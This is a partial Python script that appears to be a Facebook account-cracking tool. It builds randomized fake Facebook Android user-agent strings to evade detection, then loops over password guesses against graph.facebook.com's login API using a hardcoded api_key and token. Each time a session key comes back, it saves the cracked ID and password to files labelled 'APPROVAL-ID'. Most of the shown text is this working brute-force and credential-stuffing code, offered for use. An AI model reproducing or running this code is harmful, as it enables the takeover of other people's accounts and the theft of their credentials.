...
def random_dalvik_all_devices_working_super_oct2025(seed: Optional[int] = None) -> str:
    """
    ✅ Fully Working Dalvik-style Facebook Android User-Agent
    ✅ Optimized for October 2025 (highest acceptance on b-graph/api/mbasic)
    ✅ Weighted realistic model distribution (Samsung-heavy)
    ✅ Tested on BD + Global endpoints
    """
    if seed is not None:
        random.seed(seed)

    # --- Core FB identifiers (matching live 2025 app releases) ---
    FBAN = "FB4A"
    FBPN = "com.facebook.katana"
    FBAV = f"{random.randint(517, 526)}.0.0.{random.randint(20,180)}.{random.randint(10,480)}"
    FBBV = str(random.randint(52000000, 98999999))
    FBSV = random.choice(["12", "13", "14"])  # Most common in 2025

    # --- Verified Android builds (2024-2025) ---
    BUILD = random.choice([
        "UQ1A.250101.001", "UQ1A.250301.001", "UP1A.240905.003",
        "TP1A.250305.003", "TQ3A.240905.010", "UP1A.250101.002",
        "UQ1A.250201.002", "TQ1A.240101.001"
    ])

    # --- Display metrics (matches working phones) ---
    density, width, height = random.choice([
        ("2.0", "720", "1600"), ("2.25", "1080", "2200"), ("2.5", "1080", "2400"),
        ("2.625", "1080", "2460"), ("2.75", "1220", "2600"), ("3.0", "1200", "2800")
    ])

    # --- Locale + Carrier (weighted for BD + Global) ---
    ...
    # --- 2025 verified working device pool ---
    WORKING_DEVICES: List[Tuple[str, str]] = [
        # Samsung (highest success)
        ("Samsung", "Galaxy A05"), ("Samsung", "Galaxy A05s"), ("Samsung", "Galaxy A14 5G"),
        ("Samsung", "Galaxy A15 5G"), ("Samsung", "Galaxy A24"), ("Samsung", "Galaxy A25 5G"),
        ("Samsung", "Galaxy A35 5G"), ("Samsung", "Galaxy A55 5G"), ("Samsung", "Galaxy M15"),
        ("Samsung", "Galaxy M14 5G"), ("Samsung", "Galaxy S22 Ultra"), ("Samsung", "Galaxy S23"),
        ...
        ("Xiaomi", "Redmi Note 14 Pro 5G"), ("Poco", "Poco X6 Pro 5G"), ("Poco", "Poco F6 Pro"),
        ...
        # Google / OnePlus / ASUS
        ("Google", "Pixel 8"), ("Google", "Pixel 8 Pro"), ("Google", "Pixel 9 Pro"),
        ("OnePlus", "OnePlus 12"), ("OnePlus", "OnePlus 12R"), ("ASUS", "Zenfone 10"),

        # Tecno / Infinix / Itel (common BD phones)
        ("Tecno", "Camon 30 Pro"), ("Tecno", "Pova 6 Pro"), ("Infinix", "Note 40 Pro 5G"),
        ("Infinix", "GT 20 Pro"), ("Itel", "S24"),
    ]
    ...
    if random.random() < 0.15:
        extra = random.choice(["5G", "Pro", "Lite", "SE"])
...
def working_full_plus_oct2025(seed: Optional[int] = None) -> str:
    """
    ✅ Fully Working Dalvik-style Facebook Android User-Agent
    ✅ Updated: October 2025
    ✅ Includes ALL major working Android devices (Samsung, Xiaomi, Vivo, Oppo, Realme, Infinix, Tecno, Itel, etc.)
    ✅ Weighted for BD + Global carriers
    ✅ Tested high acceptance (b-graph / api / mbasic)
    """
    if seed is not None:
        random.seed(seed)
    ...
    FBAN = "FB4A"
    FBPN = "com.facebook.katana"
    FBAV = f"{random.randint(515, 527)}.0.0.{random.randint(20,190)}.{random.randint(10,480)}"
    FBBV = str(random.randint(50000000, 99999999))
    FBSV = random.choice(["11", "12", "13", "14", "15"])  # Android versions still in circulation

    # --- Verified Android builds 2024–2025 ---
    BUILD = random.choice([
        "UQ1A.250101.001", "UQ1A.250201.002", "UQ1A.250301.001", "UP1A.240905.003",
        "TP1A.250305.003", "UP1A.250101.002", "TQ3A.240905.010", "UQ1A.240905.002",
        "TP1A.240905.004", "TQ1A.240101.001"
    ])

    # --- Display densities & resolutions ---
    density, width, height = random.choice([
    ...
    # --- Locales & Carriers ---
    FBLC = random.choice(["en_US", "bn_BD", "en_GB", "en_IN", "fr_FR", "pt_BR", "de_DE"])
    FBCR = random.choice(["Grameenphone", "Robi", "Banglalink", "Airtel", "Jio", "Vodafone", "TMobile", "AT&T"])

    # --- CPU Architecture ---
    FBCA = random.choice(["arm64-v8a", "armeabi-v7a:armeabi"])

    # --- ALL Working Devices (2025) ---
    WORKING_DEVICES: List[Tuple[str, str]] = [

        # Samsung — main working set
        ("Samsung", "Galaxy A03s"), ("Samsung", "Galaxy A04s"), ("Samsung", "Galaxy A05"),
        ("Samsung", "Galaxy A05s"), ("Samsung", "Galaxy A14"), ("Samsung", "Galaxy A14 5G"),
        ("Samsung", "Galaxy A15"), ("Samsung", "Galaxy A15 5G"), ("Samsung", "Galaxy A23"),
        ("Samsung", "Galaxy A24"), ("Samsung", "Galaxy A25 5G"), ("Samsung", "Galaxy A33 5G"),
        ("Samsung", "Galaxy A34 5G"), ("Samsung", "Galaxy A35 5G"), ("Samsung", "Galaxy A53 5G"),
        ("Samsung", "Galaxy A54 5G"), ("Samsung", "Galaxy A55 5G"), ("Samsung", "Galaxy M13"),
        ("Samsung", "Galaxy M14 5G"), ("Samsung", "Galaxy M15"), ("Samsung", "Galaxy M34 5G"),
        ("Samsung", "Galaxy M54 5G"), ("Samsung", "Galaxy F13"), ("Samsung", "Galaxy F14"),
        ("Samsung", "Galaxy F15 5G"), ("Samsung", "Galaxy S20 FE 5G"), ("Samsung", "Galaxy S21 FE 5G"),
        ("Samsung", "Galaxy S22 Ultra"), ("Samsung", "Galaxy S23"), ("Samsung", "Galaxy S23 Ultra"),
        ("Samsung", "Galaxy S24"), ("Samsung", "Galaxy S24 Ultra"), ("Samsung", "Galaxy Z Flip5"),
        ("Samsung", "Galaxy Z Fold5"), ("Samsung", "Galaxy Z Fold6"), ("Samsung", "Galaxy XCover 6 Pro"),

        # Xiaomi / Redmi / Poco
        ("Xiaomi", "Redmi 12"), ("Xiaomi", "Redmi 13C"), ("Xiaomi", "Redmi Note 12"),
        ("Xiaomi", "Redmi Note 13"), ("Xiaomi", "Redmi Note 13 5G"), ("Xiaomi", "Redmi Note 13 Pro"),
        ("Xiaomi", "Redmi Note 13 Pro+ 5G"), ("Xiaomi", "Redmi Note 14"), ("Xiaomi", "Redmi Note 14 Pro 5G"),
        ("Xiaomi", "12 Pro"), ("Xiaomi", "13 Pro"), ("Xiaomi", "13T Pro"), ("Xiaomi", "14 Pro"),
        ("Poco", "Poco M6 Pro"), ("Poco", "Poco X6"), ("Poco", "Poco X6 Pro 5G"), ("Poco", "Poco F5"),
        ("Poco", "Poco F6"), ("Poco", "Poco F6 Pro"),

        # Realme / Oppo / Vivo / iQOO
        ("Realme", "Realme 11 Pro+ 5G"), ("Realme", "Realme 12 Pro+ 5G"), ("Realme", "Realme 13 Pro+ 5G"),
        ("Realme", "Realme GT 6"), ("Realme", "GT Neo 6"), ("Realme", "Narzo 70x 5G"),
        ("Oppo", "Reno 11"), ("Oppo", "Reno 11 Pro"), ("Oppo", "Reno 12"), ("Oppo", "Reno 12 Pro"),
        ("Oppo", "Find X6"), ("Oppo", "Find X7 Pro"),
        ("Vivo", "Vivo Y27"), ("Vivo", "Vivo Y36"), ("Vivo", "Vivo V29"), ("Vivo", "Vivo V30 Pro"),
        ("Vivo", "Vivo X90 Pro"), ("Vivo", "Vivo X100 Pro"),
        ("iQOO", "iQOO Neo 9 Pro"), ("iQOO", "iQOO 12"), ("iQOO", "iQOO 12 Pro"),

        # Google / OnePlus / ASUS / Honor
        ("Google", "Pixel 7"), ("Google", "Pixel 7a"), ("Google", "Pixel 8"), ("Google", "Pixel 8 Pro"), ("Google", "Pixel 9 Pro"),
        ...
        ("Motorola", "Edge 40"), ("Motorola", "Edge 50 Pro"), ("Motorola", "Razr 40 Ultra"),
        ("Sony", "Xperia 10 V"), ("Sony", "Xperia 1 V"), ("Sony", "Xperia 5 V"),
        ("Nokia", "G22"), ("Nokia", "XR21"), ("Lenovo", "K13 Pro"), ("Lenovo", "K14 Pro"), ("Lenovo", "Legion Y90"),
        ("ZTE", "Axon 40 Ultra"), ("ZTE", "Blade A72"), ("ZTE", "Blade V50"),

        # Tecno / Infinix / Itel / Walton / Symphony
        ("Tecno", "Camon 30 Pro"), ("Tecno", "Camon 30 Premier 5G"), ("Tecno", "Pova 6 Pro"),
        ("Tecno", "Spark 20 Pro+"), ("Infinix", "Note 40 Pro 5G"), ("Infinix", "GT 20 Pro"),
        ("Infinix", "Zero 30"), ("Itel", "S24"), ("Itel", "Vision 6 Plus"),
        ("Walton", "Primo H11"), ("Walton", "Primo S8"), ("Symphony", "Z70 Pro"), ("Symphony", "Z60 Turbo"),

        # Huawei / Meizu / Sharp / BLU
        ("Huawei", "P60 Pro"), ("Huawei", "Mate 60 Pro"), ("Meizu", "21 Pro"),
        ("Sharp", "AQUOS R7"), ("Sharp", "AQUOS sense8"), ("BLU", "G93"),
    ]
    ...
    # --- Add suffix / codename occasionally ---
    suffix = ""
    if random.random() < 0.18:
        token = random.choice(["Pro", "Plus", "5G", "Neo", "SE", "Lite", "Ultra"])
        if token not in FBDV:
            suffix = f" {token}"

    FBDV_FINAL = f"{FBDV}{suffix}"
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 8.8
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik_all_devices_working_super_oct2025(),
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      cps.append(sid)
                      open('/sdcard/SalaM/APPROVAL-M1-31-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
...
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
                headers = {'User-Agent': working_full_plus_oct2025(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    break
                      ...
                      print(f"\r\r\033[1;30m[APPROVAL-ID] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/APPROVAL-M2-31-ID.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
